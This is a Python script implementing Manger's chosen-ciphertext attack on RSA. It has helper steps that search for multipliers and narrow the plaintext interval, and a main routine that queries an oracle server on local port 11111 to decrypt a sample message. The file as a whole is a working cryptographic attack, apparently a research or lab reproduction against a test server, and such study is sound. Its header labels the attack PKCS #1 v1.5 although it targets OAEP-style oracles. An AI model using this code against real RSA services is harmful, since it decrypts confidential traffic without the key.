"""
Chosen-ciphertext attack on PKCS #1 v1.5
https://www.iacr.org/archive/crypto2001/21390229.pdf
"""
from math import log

import PKCS
from bleichenbacher_oracle import MangerOracle, get_public_constants
from oracles import PKCS1_OAEP_Oracle
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA


class PublicKey(object):
    def __init__(self, e, n):
        self.e = e
        self.n = n
        self.p = None
        self.q = None


def divceil(a, b):
    """
    Accurate division with ceil, to avoid floating point errors
    :param a: numerator
    :param b: denominator
    :return: ceil(a / b)
    """
    q, r = divmod(a, b)
    if r:
        return q + 1
    return q


def divfloor(a, b):
    """
    Accurate division with floor, to avoid floating point errors
    :param a: numerator
    :param b: denominator
    :return: floor(a / b)
    """
    q, r = divmod(a, b)
    return q


def find_f1(k, c, oracle, verbose=False):
    """
    Step 1 of the attack
    :param k: length of block in bytes
    :param c: integer representing the parameter of the attack
    :param oracle: oracle that checks whether a decryption is smaller than B
    :return: f1 such that B/2 <= f1 * m / 2 < B
    """
    f1 = 2
    counter = 0
    q_input = ((pow(f1, oracle.e, oracle.N) * c) % oracle.N)
    while oracle.query(q_input):
        f1 *= 2
        q_input = ((pow(f1, oracle.e, oracle.N) * c) % oracle.N)
        if verbose:
            print(f'counter: {counter}, f1 = {f1}')
        counter += 1
    return f1


def find_f2(k, c, f1, oracle, verbose=False):
    """
    Step 2 of the attack
    :param k: length of block in bytes
    :param c: integer representing the parameter of the attack
    :param f1: multiple from the previous step
    :param oracle: oracle that checks whether a decryption is smaller than B
    :return: f2 such that n <= f2 * m < n + B
    """
    B = 2 ** (8 * (k - 1))
    counter = 0
    f2 = divfloor(oracle.N + B, B) * divfloor(f1, 2)
    q_input = ((pow(f2, oracle.e, oracle.N) * c) % oracle.N)
    while not oracle.query(q_input):
        f2 += divfloor(f1, 2)
        q_input = ((pow(f2, oracle.e, oracle.N) * c) % oracle.N)
        counter += 1
        if verbose:
            print(f'counter: {counter}, f2 = {f2}')

    return f2


def find_m(k, c, f2, oracle, verbose=False):
    """
    Step 3 of the attack
    :param k: length of block in bytes
    :param c: integer representing the parameter of the attack
    :param f2: multiple from the previous step
    :param oracle: oracle that checks whether a decryption is smaller than B
    :return: m such that (m ** e) mod n = c
    """
    B = 2 ** (8 * (k - 1))
    m_min = divceil(oracle.N, f2)
    m_max = divfloor(oracle.N + B, f2)
    count = 0
    while m_max != m_min:
        f_tmp = divfloor(2 * B, m_max - m_min)
        i = divfloor(f_tmp * m_min, oracle.N)
        f_3 = divceil(i * oracle.N, m_min)
        q_input = ((pow(f_3, oracle.e, oracle.N) * c) % oracle.N)
        if oracle.query(q_input):
            m_max = divfloor(i * oracle.N + B, f_3)
        else:
            m_min = divceil(i * oracle.N + B, f_3)
        if verbose:
            print(f'counter: {count}, m_min={m_min}, m_max={m_max}')
        count += 1
    return m_min % oracle.N


def manger_attack(k, c, oracle, verbose=False):
    """
    Given an RSA public key and an oracle for whether a decryption is lesser than B, along with a conforming ciphertext
        c, calculate m = (c ** d) mod n
    :param k: length of ciphertext in bytes
    :param c: input parameter
    :param oracle: oracle that checks whether a decryption is smaller than B
    :return: m such that m = (c ** d) mod n
    """
    c = int.from_bytes(c, byteorder='big')

    f1 = find_f1(k, c, oracle, verbose=verbose)
    if verbose:
        print("f1 =", f1)

    f2 = find_f2(k, c, f1, oracle, verbose=verbose)
    if verbose:
        print("f2 =", f2)

    m = find_m(k, c, f2, oracle, verbose)

    # Test the result - if implemented properly the attack should always succeed
    if pow(m, oracle.e, oracle.N) == c:
        return m.to_bytes(k, byteorder='big')
    else:
        return None


def bytes_needed(n):
    if n == 0:
        return 1
    return int(log(n, 256)) + 1


if __name__ == "__main__":
    # n_length = 1024
    #
    # key = RSA.generate(n_length)
    # pub_key = key.public_key()
    # k = int(n_length / 8)
    # pkcs = PKCS.RSA_PKCS_1(2, k, key)
    # # cipher = PKCS1_OAEP.new(key)
    # message = b'secret message'
    # # c = cipher.encrypt(message)
    # c = pkcs.enc_PKCS_1(message)
    # print(c)
    # c_int = int.from_bytes(c, byteorder='big')
    # c_str = hex(c_int)
    # print(c_str)
    # print(int(c_str,16).to_bytes(k,byteorder='big'))
    server_port = 11111
    path_to_server_public_key = "/home/lubuntu/certificates/server-public-key.pem"
    public_constants = get_public_constants(path_to_server_public_key)
    manger_oracle = MangerOracle(server_port, public_constants)
    modulus_bytes = public_constants["modulus_bytes"]
    key = PublicKey(manger_oracle.e, manger_oracle.N)
    pkcs = PKCS.RSA_PKCS_1(2, modulus_bytes, key)

    message = b'secret message'
    # c = cipher.encrypt(message)
    c = pkcs.enc_PKCS_1(message)

    rnd_pad = public_constants["rnd_pad"]

    result = manger_attack(modulus_bytes, c, manger_oracle, verbose=True)
    print(result)
